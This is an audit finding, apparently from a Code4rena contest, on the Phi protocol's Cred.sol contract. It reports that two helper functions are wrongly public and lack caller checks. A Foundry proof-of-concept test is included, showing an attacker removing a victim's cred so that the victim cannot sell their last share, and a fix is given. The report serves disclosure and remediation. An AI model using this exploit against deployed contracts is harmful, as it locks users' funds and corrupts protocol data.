# Vulnerability details

## Vulnerability Details

In `Cred.sol`, both functions `_addCredIdPerAddress`[L685](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L685) and `_removeCredIdPerAddress`[L695](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L695) are mistakenly made public instead of internal.
```solidity
function _addCredIdPerAddress(uint256 credId_, address sender_) public {
    ....
}
```
```solidity
function _removeCredIdPerAddress(uint256 credId_, address sender_) public {
    ....
}
```

Since both functions also **does not** check if `msg.sender` is equals to `sender_`, meaning malicious users can call `_removeCredIdPerAddress` with `sender_` set to a victim's address to remove a cred owned by victim from the mapping `_credIdsPerAddress`.

## Impact No. 1

After the attacker does so, the victim will be unable to sell all his shares, as when the victim tries to sell all his shares, victim's new balance will be 0 and `_updateCuratorShareBalance` will again call the function `_removeCredIdPerAddress(credId_, sender_)` which will revert due to either:
1. `if (_credIdsPerAddress[sender_].length == 0) revert EmptyArray();` <ins>(If the attacker removes all the cred from `_credIdsPerAddress[sender_]` and causes the length to be 0)</ins>
2. Or on this line `if (credId_ != credIdToRemove) revert WrongCredId();` <ins>(If the attacker just removed that one cred and the victim owns more than one cred, hence length wont be 0 but credId wont match as it has been removed)</ins>

This means that when the victim tries to sell his shares, he is unable to sell all of it as he has to avoid his new balance being 0 else his sale transaction will just revert.

Since the bonding curve is somewhat quadratic, this will prove costly for the victim in the senario where the current supply of share already bought from the market is high.
1. Suppose `Alice` has `X` shares.
2. After being targetted by the attacker, `Alice` can only sell `X-1` shares.
3. After selling `X-1` shares, the total supply of shares that all shareholders are holding equals to `900`.
4. The last share that `Alice` is unable to sell will cost her an opportunity cost of ~= `0.9 ether` ~= `2k USD`.
5. Attacker can then proceed to target multiple other victims other than `Alice` and cause them to have similar amounts stuck.

## Impact No. 2
`getPositionsForCurator` is a function in `Cred.sol` which loops through `_credIdsPerAddress[curator_]` to return a list of creds whose shares are owned by the `curator_` as well as the amount of shares owned for each. By removing the cred from the victim's `_credIdsPerAddress`, `getPositionsForCurator(victim,start,stop)` will return an incorrect value with the missing cred absent from the value returned.

Since `getPositionsForCurator` is used in the frontend of the Phi protocol (confirmed with sponsor in a private thread that it is indeed used in the frontend), the above bug will cause the frontend to be working with incorrect values and might affect protocol's functionality severely, as victim's actions on the dapp will be limited due to certain parts of the protocol not recognising them as the owner of shares.

## Proof Of Concept
<ins>The following code will demonstrate **both** impact 1 and impact 2.</ins>

Add the following function into `test/Cred.t.sol:TestCred`
```solidity
function test_AddRemoveCredAttack() public {
    _createCred("BASIC", "SIGNATURE", 0x0);

    address Alice = address(0x123);

    vm.deal(Alice, 10 ether);
    uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 10);//credid,supply,amount
    vm.prank(Alice);
    cred.buyShareCred{ value: buyPrice }(1, 10, 0); //Alice now has 10 shares

    address Random_Shareholders = address(0x987);

    vm.deal(Random_Shareholders, 100 ether);
    buyPrice = bondingCurve.getBuyPriceAfterFee(1, 11, 909-11);//credid,supply,amount
    vm.prank(Random_Shareholders);
    cred.buyShareCred{ value: buyPrice }(1, 909-11, 0); //Cred now has 909 shares bought in total

    skip(2 days); // Skip pass SHARE_LOCK_PERIOD, now Alice is free to sell

    address attacker = address(0x6767);
    vm.prank(attacker);
    cred._removeCredIdPerAddress(1, Alice);

    vm.expectRevert(); //Expect that Alice will not be able to sell all of her shares
    vm.prank(Alice);
    cred.sellShareCred(1, 10, 0); //Alice tries and fails to sell all (exception caught by expectRevert above)

    vm.prank(Alice);
    cred.sellShareCred(1, 9, 0); //Alice sells X-1 of her shares instead

    require(cred.credInfo(1).currentSupply == 900); //Now cred has 900 shares bought in total
    console2.log("Cost that Alice cant claim: ", bondingCurve.getSellPriceAfterFee(1, 900, 1));

    // Alice now has one share left
    (uint256[] memory credIds, uint256[] memory amounts) = cred.getPositionsForCurator(Alice, 0, 0); //By setting stop=0, stop will be set to .length inside the function
    console2.log("Querying getPositionsForCurator: ", credIds.length);
}
```
Run `forge test --match-test AddRemoveCredAttack -vv`
```bash
[PASS] test_AddRemoveCredAttack() (gas: 986887)
Logs:
  Cost that Alice cant claim:  922233069306930694
  Querying getPositionsForCurator:  0
```
As shown, Alice ends up with ~= `0.9 ether` ~= `2k USD` stuck. Also, `getPositionsForCurator` returns an incorrect value(empty array even though `Alice` still has `1 share` left), potentially affecting the Phi Protocol functionality.

## Recommended Mititgation Steps
Make the functions `internal` as they were meant to be.
```diff
- function _addCredIdPerAddress(uint256 credId_, address sender_) public {
+ function _addCredIdPerAddress(uint256 credId_, address sender_) internal {

- function _removeCredIdPerAddress(uint256 credId_, address sender_) public {
+ function _removeCredIdPerAddress(uint256 credId_, address sender_) internal {
```
